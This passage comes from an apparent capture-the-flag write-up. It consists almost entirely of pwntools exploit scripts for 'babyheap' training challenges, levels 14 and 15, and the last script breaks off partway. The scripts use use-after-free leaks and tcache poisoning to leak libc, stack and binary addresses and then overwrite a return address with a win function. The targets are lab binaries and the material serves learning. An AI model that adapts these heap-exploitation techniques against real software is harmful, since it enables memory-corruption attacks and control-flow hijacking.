</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001A22</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffd30ef0428</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffd30ef0528</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data_bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data_base_addr <span style="color:#f92672">=</span> data_bin_echo <span style="color:#f92672">-</span> bin_echo
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;data_base_addr:&#39;</span>, hex(data_base_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;main_arena_addr:&#39;</span>, hex(main_arena_addr))
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;__environ_addr:&#39;</span>, hex(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(cur_stack_base))
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(data_base_addr <span style="color:#f92672">+</span> win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-141">level 14.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level14.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x1b9d)&#34;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main_arena_96 = 0x1ecbe0</span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2110</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x141d</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_stack <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffd02455598</span>
</span></span><span style="display:flex;"><span>stack_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffd02455698</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data_bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data_base_addr <span style="color:#f92672">=</span> data_bin_echo <span style="color:#f92672">-</span> bin_echo
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;data_base_addr:&#39;</span>, hex(data_base_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_arena_addr <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;main_arena_addr:&#39;</span>, hex(main_arena_addr))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x7fe5689fcbe0</span>
</span></span><span style="display:flex;"><span>environ_addr <span style="color:#f92672">=</span> main_arena_addr <span style="color:#f92672">-</span> main_arena_96 <span style="color:#f92672">+</span> environ
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;__environ_addr:&#39;</span>, hex(environ_addr))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x7fe568a002e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">5</span>, p64(environ_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x80</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>cur_stack_base <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print (hex(cur_stack_base))
</span></span><span style="display:flex;"><span>cur_target_stack <span style="color:#f92672">=</span> cur_stack_base <span style="color:#f92672">-</span> stack_base <span style="color:#f92672">+</span> target_stack
</span></span><span style="display:flex;"><span>print (hex(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">7</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(cur_target_stack))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x52</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">7</span>, p64(data_base_addr <span style="color:#f92672">+</span> win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-150">level 15.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;read&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(len(payload))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./babyheap_level15.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x33F8</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1b00</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#target_stack = 0x7fff4f09a332</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#stack_base = 0x7fff4f09a432</span>
</span></span><span style="display:flex;"><span>stack_ret_addr_leak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc015700e8</span>
</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc0156ff72</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data_bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data_base_addr <span style="color:#f92672">=</span> data_bin_echo <span style="color:#f92672">-</span> bin_echo
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] data_base_addr:&#39;</span>, hex(data_base_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stack_local <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x38</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>stack_ret_addr <span style="color:#f92672">=</span> stack_local <span style="color:#f92672">-</span> stack_leak <span style="color:#f92672">+</span> stack_ret_addr_leak
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] stack_local:&#39;</span>, hex(stack_local))
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] stack_ret_addr:&#39;</span>, hex(stack_ret_addr))
</span></span><span style="display:flex;"><span>
